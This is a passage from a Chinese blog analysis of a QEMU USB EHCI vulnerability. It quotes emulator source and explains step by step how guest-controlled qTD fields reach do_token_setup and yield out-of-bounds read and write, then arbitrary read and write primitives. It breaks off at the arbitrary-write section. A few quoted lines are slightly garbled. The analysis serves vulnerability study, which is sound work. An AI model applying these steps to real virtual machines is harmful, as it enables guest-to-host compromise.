<p>因此这里我们除了需要保证<code>q-&gt;qh.token &amp; (1 &lt;&lt; 7) == 1</code>，<code>q-&gt;qh.current_qtd</code>的最后一个<code>bit == 0</code>以及<code>q-&gt;qh.current_qtd != 0</code>这三个明显的条件之外还需要保证<code>q-&gt;seen==0</code>等防止进入到相关的<code>if</code>条件分支直接<code>goto out</code>，才可以触发到<code>ehci_set_state(ehci, async, EST_FETCHQTD); </code>函数的调用将状态机转换为<code>EST_FETCHQTD</code>。</p>
<p>那么这里的<code>qh</code>是怎么来的呢，<code>qh</code>是通过下面的函数调用得到的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr), (uint32_t *) &amp;qh, sizeof(EHCIqh) &gt;&gt; 2)</span><br></pre></td></tr></table></figure>

<p>也就是通过<code>entry</code>得到的，因此这里的<code>qh</code>的内容我们可以控制。那么将状态转换到<code>EST_FETCHQTD</code>之后，我们来看一下该状态处理函数<code>ehci_state_fetchqtd</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_state_fetchqtd</span><span class="params">(EHCIQueue *q)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIqtd qtd;</span><br><span class="line">    EHCIPacket *p;</span><br><span class="line">    <span class="type">int</span> again = <span class="number">1</span>;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line"></span><br><span class="line">    addr = NLPTR_GET(q-&gt;qtdaddr);</span><br><span class="line">    <span class="keyword">if</span> (get_dwords(q-&gt;ehci, addr +  <span class="number">8</span>, &amp;qtd.token,   <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    barrier();</span><br><span class="line">    <span class="keyword">if</span> (get_dwords(q-&gt;ehci, addr +  <span class="number">0</span>, &amp;qtd.next,    <span class="number">1</span>) &lt; <span class="number">0</span> ||</span><br><span class="line">        get_dwords(q-&gt;ehci, addr +  <span class="number">4</span>, &amp;qtd.altnext, <span class="number">1</span>) &lt; <span class="number">0</span> ||</span><br><span class="line">        get_dwords(q-&gt;ehci, addr + <span class="number">12</span>, qtd.bufptr,</span><br><span class="line">                   ARRAY_SIZE(qtd.bufptr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ehci_trace_qtd(q, NLPTR_GET(q-&gt;qtdaddr), &amp;qtd);</span><br><span class="line"></span><br><span class="line">    p = QTAILQ_FIRST(&amp;q-&gt;packets);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ehci_verify_qtd(p, &amp;qtd)) &#123;</span><br><span class="line">            ehci_cancel_queue(q);</span><br><span class="line">            <span class="keyword">if</span> (qtd.token &amp; QTD_TOKEN_ACTIVE) &#123;</span><br><span class="line">                ehci_trace_guest_bug(q-&gt;ehci, <span class="string">&quot;guest updated active qTD&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            p = <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p-&gt;qtd = qtd;</span><br><span class="line">            ehci_qh_do_overlay(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// #define QTD_TOKEN_ACTIVE              (1 &lt;&lt; 7)</span></span><br><span class="line">    <span class="keyword">if</span> (!(qtd.token &amp; QTD_TOKEN_ACTIVE)) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = ehci_alloc_packet(q);</span><br><span class="line">        p-&gt;qtdaddr = q-&gt;qtdaddr;</span><br><span class="line">        p-&gt;qtd = qtd;</span><br><span class="line">        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE); <span class="comment">// 目标位置</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从<code>ehci_state_fetchqh</code>函数中<code>q-&gt;qtdaddr = q-&gt;qh.current_qtd;</code>我们可以知道<code>qtaddr</code>是通过<code>qh.current_qtd</code>来进行控制的，而我们又能够控制<code>qh</code>的内容，因此这里的<code>qtaddr</code>我们也可以直接进行控制，也就是可以直接控制<code>qtd</code>，因此这里我们只需要设置<code>qtd.token &amp; (1 &lt;&lt; 7) &gt; 0</code>即可。那么就会发生<code> ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);</code>的调用将状态机的状态转换为<code>EST_EXECUTE</code>，也就是会调用到我们的目标函数<code>ehci_state_execute</code>。我们看一下该函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_state_execute</span><span class="params">(EHCIQueue *q)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIPacket *p = QTAILQ_FIRST(&amp;q-&gt;packets);</span><br><span class="line">    <span class="type">int</span> again = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    assert(p != <span class="literal">NULL</span>);</span><br><span class="line">    assert(p-&gt;qtdaddr == q-&gt;qtdaddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ehci_qh_do_overlay(q) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO verify enough time remains in the uframe as in 4.4.1.1</span></span><br><span class="line">    <span class="comment">// TODO write back ptr to async list when done or out of time</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 4.10.3, bottom of page 82, go horizontal on transaction counter == 0 */</span></span><br><span class="line">    <span class="keyword">if</span> (!q-&gt;async &amp;&amp; q-&gt;transact_ctr == <span class="number">0</span>) &#123;</span><br><span class="line">        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;async) &#123;</span><br><span class="line">        ehci_set_usbsts(q-&gt;ehci, USBSTS_REC);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    again = ehci_execute(p, <span class="string">&quot;process&quot;</span>); <span class="comment">// 目标函数</span></span><br><span class="line">    <span class="keyword">if</span> (again == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;packet.status == USB_RET_ASYNC) &#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTING);</span><br><span class="line">    again = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里<code>ehci_execute(p, &quot;process&quot;);</code>的调用可以直接进行调用，进而直接调用<code>usb_handle_packet(p-&gt;queue-&gt;dev, &amp;p-&gt;packet);</code>再进入<code>usb_process_one(p);</code>我们看一下该函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">usb_process_one</span><span class="params">(USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    USBDevice *dev = p-&gt;ep-&gt;dev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Handlers expect status to be initialized to USB_RET_SUCCESS, but it</span></span><br><span class="line"><span class="comment">     * can be USB_RET_NAK here from a previous usb_process_one() call,</span></span><br><span class="line"><span class="comment">     * or USB_RET_ASYNC from going through usb_queue_one().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    p-&gt;status = USB_RET_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;ep-&gt;nr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* control pipe */</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;parameter) &#123;</span><br><span class="line">            do_parameter(dev, p);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (p-&gt;pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">            do_token_setup(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">            do_token_in(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">            do_token_out(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            p-&gt;status = USB_RET_STALL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* data pipe */</span></span><br><span class="line">        usb_device_handle_data(dev, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>switch</code>分支函数的调用是根据<code>p-&gt;pid</code>实现的。而<code>p-&gt;pid</code>的赋值是通过<code>ehci_execute</code>函数中的<code>p-&gt;pid = ehci_get_pid(&amp;p-&gt;qtd);</code>调用来实现的。由于我们可以控制<code>qtd</code>，因此这里的<code>pid</code>也可以进行控制。也就是我们可以控制调用任何一个分支函数。</p>
<p>接下来看一下漏洞函数<code>do_token_setup</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_token_setup</span><span class="params">(USBDevice *s, USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> request, value, index;qtd-&gt;token</span><br><span class="line"></span><br><span class="line">    <span class="title function_">if</span> <span class="params">(p-&gt;iov.size != <span class="number">8</span>)</span> &#123;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">    s-&gt;setup_index = <span class="number">0</span>;</span><br><span class="line">    p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_len &gt; <span class="keyword">sizeof</span>(s-&gt;data_buf)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                <span class="string">&quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;</span>,</span><br><span class="line">                s-&gt;setup_len, <span class="keyword">sizeof</span>(s-&gt;data_buf));</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"><span class="comment">// #define USB_DIR_IN			0x80</span></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">        usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                  s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_SETUP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status != USB_RET_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;actual_length &lt; s-&gt;setup_len) &#123;</span><br><span class="line">            s-&gt;setup_len = p-&gt;actual_length;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_len == <span class="number">0</span>)</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;actual_length = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着就到了漏洞存在的函数了。首先需要满足<code>p-&gt;iov.size</code>，该值是由<code>qtd-&gt;token</code>决定的，<code>setup_buf</code>的地址是由<code>qtd-&gt;bufptr</code>确定的，因此这里的长度可控。这个就是在<code>do_token_setup</code>这个函数的前面制定的也就是<code>iov.size=8</code>之后的<code>usb_packet_copy</code>函数的调用将<code>iov</code>中的内容拷贝到了<code>setup_buf</code>中。</p>
<h2 id="越界读"><a href="#越界读" class="headerlink" title="越界读"></a>越界读</h2><p>越界读我们首先需要调用的是<code>do_token_setup</code>这个函数造成越界条件之后，在调用<code>do_token_in</code>这个函数进行越界读，要想调用这个函数我们需要先看一下<code>p-&gt;pid</code>的赋值函数<code>ehci_get_pid</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> </span></span><br><span class="line">(data, field) \</span><br><span class="line">    (((data) &amp; field##_MASK) &gt;&gt; field##_SH)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QTD_TOKEN_PID_MASK            0x00000300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QTD_TOKEN_PID_SH              8</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_get_pid</span><span class="params">(EHCIqtd *qtd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (get_field(qtd-&gt;token, QTD_TOKEN_PID)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_OUT;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_IN;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_SETUP;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;bad token\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此这里我们要调用<code>do_token_setup</code>函数的话，需要设置<code>(qtd-&gt;token &amp; 0x300) &gt;&gt; 8 == 2</code>。进入<code>do_token_setup</code>函数之后在根据<code>s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</code>设置<code>setup_len</code>的值。这里需要我们提前设置<code>p-&gt;iov.size = 8</code>，这个值暂时不知道怎么计算的</p>
<blockquote>
<p>其中 p-&gt;iov.size大小由 qtd-&gt;token = size &lt;&lt; QTD_TOKEN_TBYTES_SH 控制。这一块主要看后面的iov.size部分的内容</p>
</blockquote>
<p>。为了之后进入指定的分支，我们在<code>setup</code>函数中需要进入到<code>s-&gt;setup_state = SETUP_STATE_DATA;</code>的调用。因此我们需要满足<code>s-&gt;setup_buf[0] &amp; USB_DIR_IN == 1</code>（其实<code>if</code>的两个分支都可以进行设置，但是这里根据<code>do_token_in</code>里面的判断条件选择进入<code>if</code>成立的分支）。需要注意的是这里需要在设置<code>setup_len</code>之前进行设置，因为在设置<code>setup_len</code>之后，由于我们是进行越界读，因此<code>if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) </code>判断会成立，函数直接返回无法设置<code>s-&gt;setup_state</code>，只能是首先进行一次正常的读取设置完成状态之后在进行<code>setup_len</code>的设置，最后进行越界的读取。</p>
<p>在调用完毕<code>setup</code>函数，设置完<code>setup_len</code>之后，就可以需要设置<code>(qtd-&gt;token &amp; 0x300) &gt;&gt; 8 == 1</code>，以用来调用<code>do_token_in</code>函数。</p>
<h2 id="越界写"><a href="#越界写" class="headerlink" title="越界写"></a>越界写</h2><p>越界写，首先需要设置<code>(qtd-&gt;token &amp; 0x300) &gt;&gt; 8 == 2</code>调用<code>do_token_setup</code>函数设置<code>setup_len</code>的值，接着需要设置<code>s-&gt;setup_buf[0] &amp; USB_DIR_IN == 0</code>也就是<code>s-&gt;setup_buf[0] = USB_DIR_OUT</code>，这里也是根据<code>do_token_out</code>函数里面的写入条件判断进行设置的。选择<code>if</code>不成立时候的分支设置<code>s-&gt;setup_state = SETUP_STATE_DATA;</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;<span class="comment">// 所以这里需要设置的是s-&gt;setup_buf[0] = USB_DIR_OUT</span></span><br><span class="line">  <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">    len = p-&gt;iov.size;</span><br><span class="line">  &#125;</span><br><span class="line">  usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">  s-&gt;setup_index += len;</span><br><span class="line">  <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">    s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h2><p>首先我们先看一下<code>setup_len,setup_buf</code>所在的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="type">char</span> *port_path;</span><br><span class="line">    <span class="type">char</span> *serial;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Actual connected speed */</span></span><br><span class="line">    <span class="type">int</span> speed;</span><br><span class="line">    <span class="comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span></span><br><span class="line">    <span class="type">int</span> speedmask;</span><br><span class="line">    <span class="type">uint8_t</span> addr;</span><br><span class="line">    <span class="type">char</span> product_desc[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span> auto_attach;</span><br><span class="line">    <span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">    <span class="type">int32_t</span> state;</span><br><span class="line">    <span class="type">uint8_t</span> setup_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="type">uint8_t</span> data_buf[<span class="number">4096</span>]; <span class="comment">// 拷贝对象</span></span><br><span class="line">    <span class="type">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="type">int32_t</span> setup_state;</span><br><span class="line">    <span class="type">int32_t</span> setup_len;</span><br><span class="line">    <span class="type">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    <span class="type">const</span> USBDesc *usb_desc; <span class="comment">/* Overrides class usb_desc if not NULL */</span></span><br><span class="line">    <span class="type">const</span> USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> configuration;</span><br><span class="line">    <span class="type">int</span> ninterfaces;</span><br><span class="line">    <span class="type">int</span> altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    <span class="type">const</span> USBDescConfig *config;</span><br><span class="line">    <span class="type">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>接着我们看一下<code>do_token_in</code>也就是读函数中的核心部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">  <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">    len = p-&gt;iov.size;</span><br><span class="line">  &#125;</span><br><span class="line">  usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">  s-&gt;setup_index += len;</span><br><span class="line">  <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">    s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的读操作是将<code>s-&gt;data_buf + s-&gt;setup_index</code>作为拷贝的起始地址，将<code>s-&gt;setup_len - s-&gt;setup_index</code>作为拷贝的长度，进行了内存的拷贝。</p>
<p>那么这里如果我们首先将<code>setup_len</code>设置为<code>0x1010</code>也就是溢出<code>0x10</code>字节。调用越界写函数覆写<code>setup_len=0x1010,setup_index=0xfffffff8</code>即可以覆写<code>setup_buf[8]</code>这个数组。</p>
<p>覆写<code>setup_buf[0]=USB_DIR_IN</code>，将<code>setup_index</code>设置为<code>target_addr - s-&gt;data_buf - 0x1018</code>，那么<code>len = s-&gt;setup_len - s-&gt;setup_index = 0x1018</code>，越界写入结束之后<code>s-&gt;setup_index += len</code>，此时<code>setup_index = target_addr - s-&gt;data_buf</code>。</p>
<p>那么此时再调用一次读函数，目标地址就变为了<code>target_addr</code>，也就是实现了任意读。</p>
<h2 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h2><p>通过<code>do_token_setup</code>设置<code>setup_len=0x1010</code></p>
